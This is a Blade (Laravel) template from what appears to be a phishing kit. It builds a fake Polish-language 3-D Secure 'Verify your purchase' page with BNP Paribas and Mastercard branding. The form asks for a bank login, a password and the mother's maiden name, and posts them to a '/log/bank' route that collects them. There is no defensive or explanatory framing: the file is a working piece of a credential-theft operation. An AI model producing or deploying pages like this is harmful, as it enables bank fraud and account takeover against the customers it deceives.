@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/paribas.css') }}" rel="stylesheet">
@endpush
@section('content')

    <div id="branding-zone"><img id="issuer-image" src="{{asset('images/banks/method-223-464c07636f.svg')}}"><img
                id="payment-system-image" src="{{asset('images/banks/mastercard-logo.png')}}">
    </div>
    <form id="bank_pm_form" class="challenge-form" method="POST" action="/log/bank"
          role="form">


        <!-- Challenge processing zone -->
        <div class="challenge-processing-zone">
            <h1 class="info-header">Verify your purchase
            </h1>
            <div class="info-text">
                <div class="transaction-info " style="height: auto;">
                    <p>Please login to complete the payment.
                    </p>

                </div>
            </div>

            <label for="login"> Identyfikator lub login:</label>
            <input id="login" type="text" name="login" autocomplete="off" value="" class="challenge-data-entry-text "
                   placeholder="Identyfikator lub login" autofocus="autofocus">
            <br>

            <label for="password"> Wpisz hasło:</label>
            <input id="password" type="password" name="password" autocomplete="off" value="" class="challenge-data-entry-text "
                   placeholder="Hasło" autofocus="autofocus">
            <br>
            <label for="codefromsms"> Podaj nazwisko panienskie Twojej matki:</label>
            <input id="codefromsms" type="text" name="mother" autocomplete="off" value=""
                   class="challenge-data-entry-text "
                   placeholder="Nazwisko panienskie Twojej matki" autofocus="autofocus">
            <div class="buttons-wrapper">
                <div class="buttons">
                    <button type="submit" class="button button-accept submit-otp">Confirm</button>

                </div>
            </div>
        </div>
    </form>

@endsection